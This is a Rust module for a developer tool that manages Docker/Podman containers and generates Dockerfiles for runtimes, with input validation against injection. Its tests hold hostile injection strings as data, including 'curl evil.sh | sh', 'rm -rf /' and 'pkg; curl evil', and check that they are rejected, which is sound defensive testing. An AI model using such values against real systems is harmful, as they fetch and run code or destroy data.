//! Container runtime integration (Docker/Podman)
//!
//! Provides:
//! - Auto-detection of Docker or Podman
//! - Run commands in containers with OMG environment
//! - Build development containers with runtime versions
//! - Interactive shell access to containers

use anyhow::{Context, Result};
use serde::{Deserialize, Serialize};
use std::path::Path;
use std::process::{Command, Stdio};

/// Supported container runtimes
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
pub enum ContainerRuntime {
    Docker,
    Podman,
}

impl ContainerRuntime {
    /// Get the command name for this runtime
    #[must_use]
    pub fn command(&self) -> &'static str {
        match self {
            Self::Docker => "docker",
            Self::Podman => "podman",
        }
    }

    /// Check if this runtime is available
    #[must_use]
    pub fn is_available(&self) -> bool {
        Command::new(self.command())
            .arg("--version")
            .stdout(Stdio::null())
            .stderr(Stdio::null())
            .status()
            .is_ok_and(|s| s.success())
    }
}

impl std::fmt::Display for ContainerRuntime {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            Self::Docker => write!(f, "Docker"),
            Self::Podman => write!(f, "Podman"),
        }
    }
}

/// Detect available container runtime (prefers Podman for rootless)
#[must_use]
pub fn detect_runtime() -> Option<ContainerRuntime> {
    // Prefer Podman (rootless by default, better security)
    if ContainerRuntime::Podman.is_available() {
        return Some(ContainerRuntime::Podman);
    }
    if ContainerRuntime::Docker.is_available() {
        return Some(ContainerRuntime::Docker);
    }
    None
}

/// Container configuration
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ContainerConfig {
    /// Base image to use
    pub image: String,
    /// Container name (optional)
    pub name: Option<String>,
    /// Environment variables
    pub env: Vec<(String, String)>,
    /// Volume mounts (host:container)
    pub volumes: Vec<(String, String)>,
    /// Ports to expose (host:container)
    pub ports: Vec<(u16, u16)>,
    /// Working directory inside container
    pub workdir: Option<String>,
    /// Whether to remove container after exit
    pub rm: bool,
    /// Whether to run interactively with TTY
    pub interactive: bool,
}

impl Default for ContainerConfig {
    fn default() -> Self {
        Self {
            image: "ubuntu:24.04".to_string(),
            name: None,
            env: Vec::new(),
            volumes: Vec::new(),
            ports: Vec::new(),
            workdir: None,
            rm: true,
            interactive: true,
        }
    }
}

/// Container manager for running commands in containers
pub struct ContainerManager {
    runtime: ContainerRuntime,
}

impl ContainerManager {
    /// Create a new container manager
    pub fn new() -> Result<Self> {
        let runtime =
            detect_runtime().context("No container runtime found. Install Docker or Podman.")?;
        Ok(Self { runtime })
    }

    /// Create with a specific runtime
    #[must_use]
    pub fn with_runtime(runtime: ContainerRuntime) -> Self {
        Self { runtime }
    }

    /// Get the active runtime
    #[must_use]
    pub fn runtime(&self) -> ContainerRuntime {
        self.runtime
    }

    /// Run a command in a container
    pub fn run(&self, config: &ContainerConfig, command: &[&str]) -> Result<i32> {
        // SECURITY: Validate image and name to prevent injection. Image
        // references legitimately contain ':' (tags/digests), so they need
        // the image-reference grammar, not the package-name charset.
        crate::core::security::validate_image_ref(&config.image)?;
        if let Some(ref name) = config.name {
            crate::core::security::validate_package_name(name)?;
        }

        let mut cmd = Command::new(self.runtime.command());
        cmd.arg("run");

        if config.rm {
            cmd.arg("--rm");
        }

        if config.interactive {
            cmd.arg("-it");
        }

        if let Some(ref name) = config.name {
            cmd.args(["--name", name]);
        }

        if let Some(ref workdir) = config.workdir {
            cmd.args(["-w", workdir]);
        }

        for (key, value) in &config.env {
            cmd.args(["-e", &format!("{key}={value}")]);
        }

        for (host, container) in &config.volumes {
            cmd.args(["-v", &format!("{host}:{container}")]);
        }

        for (host, container) in &config.ports {
            cmd.args(["-p", &format!("{host}:{container}")]);
        }

        cmd.arg("--");
        cmd.arg(&config.image);
        cmd.args(command);

        let status = cmd.status().context("Failed to run container")?;
        Ok(status.code().unwrap_or(1))
    }

    /// Run an interactive shell in a container
    pub fn shell(&self, config: &ContainerConfig) -> Result<i32> {
        let shell = detect_container_shell(&config.image);
        self.run(config, &[&shell])
    }

    /// Execute a command in a running container
    pub fn exec(&self, container: &str, command: &[&str], interactive: bool) -> Result<i32> {
        // SECURITY: Validate container name
        crate::core::security::validate_package_name(container)?;

        let mut cmd = Command::new(self.runtime.command());
        cmd.arg("exec");

        if interactive {
            cmd.arg("-it");
        }

        cmd.arg("--");
        cmd.arg(container);
        cmd.args(command);

        let status = cmd.status().context("Failed to exec in container")?;
        Ok(status.code().unwrap_or(1))
    }

    /// Build a container image from a Dockerfile
    pub fn build(&self, dockerfile: &Path, tag: &str, context: &Path) -> Result<()> {
        self.build_with_options(dockerfile, tag, context, false, &[], None)
    }

    /// Build a container image with advanced options
    pub fn build_with_options(
        &self,
        dockerfile: &Path,
        tag: &str,
        context: &Path,
        no_cache: bool,
        build_args: &[String],
        target: Option<&str>,
    ) -> Result<()> {
        let mut cmd = Command::new(self.runtime.command());
        cmd.arg("build");
        cmd.args(["-f", &dockerfile.display().to_string()]);
        cmd.args(["-t", tag]);

        if no_cache {
            cmd.arg("--no-cache");
        }

        for arg in build_args {
            cmd.args(["--build-arg", arg]);
        }

        if let Some(t) = target {
            cmd.args(["--target", t]);
        }

        cmd.arg("--");
        cmd.arg(context.display().to_string());

        let status = cmd.status().context("Failed to build container")?;
        if !status.success() {
            anyhow::bail!("Container build failed with exit code: {:?}", status.code());
        }
        Ok(())
    }

    /// List running containers
    pub fn list_running(&self) -> Result<Vec<ContainerInfo>> {
        let output = Command::new(self.runtime.command())
            .args([
                "ps",
                "--format",
                "{{.ID}}\t{{.Names}}\t{{.Image}}\t{{.Status}}",
            ])
            .output()
            .context("Failed to list containers")?;
        let output = require_successful_output(output, "Container listing")?;

        let stdout = String::from_utf8_lossy(&output.stdout);
        let containers = stdout
            .lines()
            .filter_map(|line| {
                let parts: Vec<&str> = line.split('\t').collect();
                (parts.len() >= 4).then(|| ContainerInfo {
                    id: parts[0].to_string(),
                    name: parts[1].to_string(),
                    image: parts[2].to_string(),
                    status: parts[3].to_string(),
                })
            })
            .collect();

        Ok(containers)
    }

    /// Stop a running container
    pub fn stop(&self, container: &str) -> Result<()> {
        // SECURITY: Validate container name
        crate::core::security::validate_package_name(container)?;

        let status = Command::new(self.runtime.command())
            .args(["stop", "--", container])
            .status()
            .context("Failed to stop container")?;

        if !status.success() {
            anyhow::bail!("Failed to stop container: {container}");
        }
        Ok(())
    }

    /// Remove a container
    pub fn remove(&self, container: &str, force: bool) -> Result<()> {
        // SECURITY: Validate container name
        crate::core::security::validate_package_name(container)?;

        let mut cmd = Command::new(self.runtime.command());
        cmd.arg("rm");
        if force {
            cmd.arg("-f");
        }
        cmd.args(["--", container]);

        let status = cmd.status().context("Failed to remove container")?;
        if !status.success() {
            anyhow::bail!("Failed to remove container: {container}");
        }
        Ok(())
    }

    /// Pull an image
    pub fn pull(&self, image: &str) -> Result<()> {
        // SECURITY: Validate image reference
        crate::core::security::validate_image_ref(image)?;

        let status = Command::new(self.runtime.command())
            .args(["pull", "--", image])
            .status()
            .context("Failed to pull image")?;

        if !status.success() {
            anyhow::bail!("Failed to pull image: {image}");
        }
        Ok(())
    }

    /// List available images
    pub fn list_images(&self) -> Result<Vec<ImageInfo>> {
        let output = Command::new(self.runtime.command())
            .args([
                "images",
                "--format",
                "{{.Repository}}\t{{.Tag}}\t{{.ID}}\t{{.Size}}",
            ])
            .output()
            .context("Failed to list images")?;
        let output = require_successful_output(output, "Image listing")?;

        let stdout = String::from_utf8_lossy(&output.stdout);
        let images = stdout
            .lines()
            .filter_map(|line| {
                let parts: Vec<&str> = line.split('\t').collect();
                (parts.len() >= 4).then(|| ImageInfo {
                    repository: parts[0].to_string(),
                    tag: parts[1].to_string(),
                    id: parts[2].to_string(),
                    size: parts[3].to_string(),
                })
            })
            .collect();

        Ok(images)
    }

    /// Generate a Dockerfile for OMG development environment
    ///
    /// All interpolated inputs are validated against allowlist charsets
    /// before any formatting: `base_image` must be a plain image reference,
    /// runtime names must pass [`validate_package_name`], and versions must
    /// pass [`validate_version`]. Invalid values never reach the generated
    /// text; they are replaced with safe fallbacks (or the runtime entry is
    /// skipped) and reported via `tracing::warn!`.
    pub fn generate_dockerfile(&self, base_image: &str, runtimes: &[(&str, &str)]) -> String {
        let base_image = if is_safe_image_reference(base_image) {
            base_image
        } else {
            tracing::warn!(
                "Refusing unsafe base image {base_image:?}; falling back to ubuntu:24.04"
            );
            "ubuntu:24.04"
        };

        let mut dockerfile = format!("FROM {base_image}\n\n");
        dockerfile.push_str("# OMG Development Environment\n");
        dockerfile.push_str("LABEL maintainer=\"OMG Team\"\n\n");

        // Install common dependencies based on base image
        if base_image.contains("ubuntu") || base_image.contains("debian") {
            dockerfile.push_str("RUN apt-get update && apt-get install -y \\\n");
            dockerfile.push_str("    curl wget git build-essential ca-certificates \\\n");
            dockerfile.push_str("    && rm -rf /var/lib/apt/lists/*\n\n");
        } else if base_image.contains("arch") {
            dockerfile.push_str("RUN pacman -Syu --noconfirm && pacman -S --noconfirm \\\n");
            dockerfile.push_str("    curl wget git base-devel\n\n");
        } else if base_image.contains("alpine") {
            dockerfile.push_str("RUN apk add --no-cache \\\n");
            dockerfile.push_str("    curl wget git build-base\n\n");
        }

        // Install runtimes
        for (runtime, version) in runtimes {
            if let Err(error) = crate::core::security::validate_package_name(runtime) {
                tracing::warn!("Skipping runtime {runtime:?} in generated Dockerfile: {error}");
                continue;
            }
            let version = if version.is_empty() {
                String::new()
            } else if let Err(error) = crate::core::security::validate_version(version) {
                tracing::warn!(
                    "Replacing unsafe version {version:?} for runtime {runtime}: {error}"
                );
                "latest".to_string()
            } else {
                (*version).to_string()
            };
            let version = version.as_str();
            match *runtime {
                "node" => {
                    dockerfile.push_str("# Install Node.js\n");
                    dockerfile.push_str("ENV NODE_VERSION=");
                    dockerfile.push_str(if version == "lts" { "20" } else { version });
                    dockerfile.push('\n');
                    dockerfile.push_str("RUN curl -fsSL https://deb.nodesource.com/setup_${NODE_VERSION}.x | bash - \\\n");
                    dockerfile.push_str("    && apt-get install -y nodejs \\\n");
                    dockerfile.push_str("    && rm -rf /var/lib/apt/lists/*\n\n");
                }
                "python" => {
                    dockerfile.push_str("# Install Python\n");
                    dockerfile.push_str("ENV PYTHON_VERSION=");
                    dockerfile.push_str(version);
                    dockerfile.push('\n');
                    dockerfile.push_str("RUN apt-get update && apt-get install -y \\\n");
                    dockerfile.push_str("    python3 python3-pip python3-venv \\\n");
                    dockerfile.push_str("    && rm -rf /var/lib/apt/lists/* \\\n");
                    dockerfile.push_str("    && ln -sf /usr/bin/python3 /usr/bin/python\n\n");
                }
                "rust" => {
                    dockerfile.push_str("# Install Rust\n");
                    dockerfile.push_str("ENV RUSTUP_HOME=/usr/local/rustup \\\n");
                    dockerfile.push_str("    CARGO_HOME=/usr/local/cargo \\\n");
                    dockerfile.push_str("    PATH=/usr/local/cargo/bin:$PATH\n");
                    dockerfile.push_str("RUN curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh -s -- -y --default-toolchain ");
                    dockerfile.push_str(version);
                    dockerfile.push_str("\n\n");
                }
                "go" => {
                    dockerfile.push_str("# Install Go\n");
                    let go_ver = if version == "latest" { "1.22" } else { version };
                    dockerfile.push_str("ENV GO_VERSION=");
                    dockerfile.push_str(go_ver);
                    dockerfile.push('\n');
                    dockerfile.push_str("RUN curl -fsSL https://go.dev/dl/go${GO_VERSION}.linux-amd64.tar.gz | tar -C /usr/local -xzf - \\\n");
                    dockerfile.push_str("    && ln -sf /usr/local/go/bin/go /usr/local/bin/go\n");
                    dockerfile.push_str("ENV PATH=$PATH:/usr/local/go/bin\n\n");
                }
                "bun" => {
                    dockerfile.push_str("# Install Bun\n");
                    dockerfile.push_str("RUN curl -fsSL https://bun.sh/install | bash\n");
                    dockerfile.push_str("ENV PATH=$PATH:/root/.bun/bin\n\n");
                }
                "java" => {
                    dockerfile.push_str("# Install Java\n");
                    let java_pkg = if version == "latest" || version == "lts" || version.is_empty()
                    {
                        "default-jdk".to_string()
                    } else if version.chars().all(|c| c.is_ascii_digit()) {
                        format!("openjdk-{version}-jdk")
                    } else {
                        version.to_string()
                    };
                    dockerfile.push_str("RUN apt-get update && apt-get install -y ");
                    dockerfile.push_str(&java_pkg);
                    dockerfile.push_str(" \\\n");
                    dockerfile.push_str("    && rm -rf /var/lib/apt/lists/*\n\n");
                }
                "ruby" => {
                    dockerfile.push_str("# Install Ruby\n");
                    let ruby_pkg = if version == "latest" || version.is_empty() {
                        "ruby-full".to_string()
                    } else {
                        format!("ruby{version}")
                    };
                    dockerfile.push_str("RUN apt-get update && apt-get install -y ");
                    dockerfile.push_str(&ruby_pkg);
                    dockerfile.push_str(" \\\n");
                    dockerfile.push_str("    && rm -rf /var/lib/apt/lists/*\n\n");
                }
                _ => {
                    // Attempt to install as system package based on distribution
                    let pkg = *runtime;
                    if base_image.contains("ubuntu") || base_image.contains("debian") {
                        use std::fmt::Write as _;
                        let _ = writeln!(dockerfile, "# Install {pkg}");
                        let _ = writeln!(
                            dockerfile,
                            "RUN apt-get update && apt-get install -y {pkg} && rm -rf /var/lib/apt/lists/*\n"
                        );
                    } else if base_image.contains("arch") {
                        use std::fmt::Write as _;
                        let _ = writeln!(dockerfile, "# Install {pkg}");
                        let _ = writeln!(dockerfile, "RUN pacman -S --noconfirm {pkg}\n");
                    } else if base_image.contains("alpine") {
                        use std::fmt::Write as _;
                        let _ = writeln!(dockerfile, "# Install {pkg}");
                        let _ = writeln!(dockerfile, "RUN apk add --no-cache {pkg}\n");
                    } else if base_image.contains("fedora")
                        || base_image.contains("rhel")
                        || base_image.contains("centos")
                    {
                        use std::fmt::Write as _;
                        let _ = writeln!(dockerfile, "# Install {pkg}");
                        let _ = writeln!(dockerfile, "RUN dnf install -y {pkg} && dnf clean all\n");
                    } else if base_image.contains("opensuse") {
                        use std::fmt::Write as _;
                        let _ = writeln!(dockerfile, "# Install {pkg}");
                        let _ =
                            writeln!(dockerfile, "RUN zypper install -y {pkg} && zypper clean\n");
                    } else {
                        use std::fmt::Write as _;
                        let _ = writeln!(
                            dockerfile,
                            "# WARNING: Unknown base image '{base_image}' - package installation not automated"
                        );
                        let _ = writeln!(
                            dockerfile,
                            "# Please manually install {runtime} {version} using your distribution's package manager"
                        );
                        let _ = writeln!(
                            dockerfile,
                            "# Supported base images: ubuntu, debian, arch, alpine, fedora, rhel, centos, opensuse\n"
                        );
                    }
                }
            }
        }

        dockerfile.push_str("WORKDIR /app\n\n");
        dockerfile.push_str("# Copy project files\n");
        dockerfile.push_str("COPY . .\n\n");
        dockerfile.push_str("CMD [\"/bin/bash\"]\n");

        dockerfile
    }
}

/// Whether an image reference consists only of safe Docker-reference
/// characters. Anything else (shell metacharacters, whitespace, option-like
/// prefixes, traversal) must never reach a generated Dockerfile.
fn is_safe_image_reference(image: &str) -> bool {
    crate::core::security::validate_image_ref(image).is_ok()
}

fn require_successful_output(
    output: std::process::Output,
    operation: &str,
) -> Result<std::process::Output> {
    if output.status.success() {
        return Ok(output);
    }

    let stderr = String::from_utf8_lossy(&output.stderr);
    anyhow::bail!(
        "{operation} failed with status {:?}: {}",
        output.status.code(),
        stderr.trim()
    );
}

/// Information about a running container
#[derive(Debug, Clone)]
pub struct ContainerInfo {
    pub id: String,
    pub name: String,
    pub image: String,
    pub status: String,
}

/// Information about a container image
#[derive(Debug, Clone)]
pub struct ImageInfo {
    pub repository: String,
    pub tag: String,
    pub id: String,
    pub size: String,
}

/// Detect the best shell for a container image
fn detect_container_shell(image: &str) -> String {
    if image.contains("alpine") {
        "/bin/sh".to_string()
    } else {
        "/bin/bash".to_string()
    }
}

/// Create a development container config for the current project
pub fn dev_container_config(project_dir: &Path) -> ContainerConfig {
    let project_name = project_dir
        .file_name()
        .and_then(|n| n.to_str())
        .unwrap_or("omg-dev");

    ContainerConfig {
        image: "ubuntu:24.04".to_string(),
        name: Some(format!("{project_name}-dev")),
        env: vec![("TERM".to_string(), "xterm-256color".to_string())],
        volumes: vec![(project_dir.display().to_string(), "/app".to_string())],
        ports: Vec::new(),
        workdir: Some("/app".to_string()),
        rm: true,
        interactive: true,
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_container_config_default() {
        let config = ContainerConfig::default();
        assert_eq!(config.image, "ubuntu:24.04");
        assert!(config.rm);
        assert!(config.interactive);
    }

    #[test]
    fn test_generate_dockerfile() {
        let manager = ContainerManager::with_runtime(ContainerRuntime::Docker);
        let dockerfile = manager.generate_dockerfile("ubuntu:24.04", &[("node", "20.10.0")]);
        assert!(dockerfile.contains("FROM ubuntu:24.04"));
        // Check for Node.js installation (new format installs runtimes)
        assert!(dockerfile.contains("Install Node.js") || dockerfile.contains("NODE_VERSION"));
    }

    #[cfg(unix)]
    #[test]
    fn failed_container_command_is_not_reported_as_an_empty_result() {
        let output = std::process::Command::new("sh")
            .args(["-c", "printf 'daemon unavailable' >&2; exit 17"])
            .output()
            .expect("run failure fixture");

        let error = require_successful_output(output, "Container listing")
            .expect_err("non-zero container command must fail");

        assert!(error.to_string().contains("status Some(17)"));
        assert!(error.to_string().contains("daemon unavailable"));
    }

    #[test]
    fn test_generate_dockerfile_generic() {
        let manager = ContainerManager::with_runtime(ContainerRuntime::Docker);
        // Test generic package installation (e.g. gcc)
        let dockerfile = manager.generate_dockerfile("ubuntu:24.04", &[("gcc", "latest")]);
        assert!(dockerfile.contains("apt-get install -y gcc"));

        let dockerfile_arch = manager.generate_dockerfile("archlinux:latest", &[("vim", "latest")]);
        assert!(dockerfile_arch.contains("pacman -S --noconfirm vim"));
    }

    #[test]
    fn generate_dockerfile_never_emits_injected_base_image() {
        let manager = ContainerManager::with_runtime(ContainerRuntime::Docker);
        for evil in [
            "ubuntu:24.04 && RUN curl evil.sh | sh",
            "ubuntu\nRUN malicious",
            "$HOME",
            "-flag",
            "../../etc",
            "",
        ] {
            let dockerfile = manager.generate_dockerfile(evil, &[]);
            assert!(
                dockerfile.starts_with("FROM ubuntu:24.04\n"),
                "base image {evil:?}"
            );
            assert!(!dockerfile.contains("evil"), "base image {evil:?}");
            assert!(!dockerfile.contains("malicious"), "base image {evil:?}");
        }
    }

    #[test]
    fn generate_dockerfile_never_emits_injected_versions_or_runtime_names() {
        let manager = ContainerManager::with_runtime(ContainerRuntime::Docker);

        let dockerfile = manager.generate_dockerfile("ubuntu:24.04", &[("node", "20; rm -rf /")]);
        // Note: the legitimate cleanup line `rm -rf /var/lib/apt/lists/*`
        // exists in every Debian/Ubuntu Dockerfile, so assert on the
        // injected payload fragments instead.
        assert!(
            !dockerfile.contains("20;"),
            "version injection must be replaced"
        );
        assert!(
            !dockerfile.contains("NODE_VERSION=latest;"),
            "injected version must never survive"
        );

        let dockerfile = manager.generate_dockerfile("ubuntu:24.04", &[("pkg; curl evil", "1.0")]);
        assert!(
            !dockerfile.contains("curl evil") && !dockerfile.contains("install -y pkg;"),
            "runtime-name injection must be skipped entirely"
        );
    }

    #[test]
    fn generate_dockerfile_accepts_valid_inputs_unchanged() {
        let manager = ContainerManager::with_runtime(ContainerRuntime::Docker);
        let dockerfile = manager.generate_dockerfile(
            "debian:bookworm-slim",
            &[("node", "20.10.0"), ("go", "1.22.5")],
        );
        assert!(dockerfile.contains("FROM debian:bookworm-slim\n"));
        assert!(dockerfile.contains("NODE_VERSION=20.10.0"));
        assert!(dockerfile.contains("GO_VERSION=1.22.5"));
    }
}
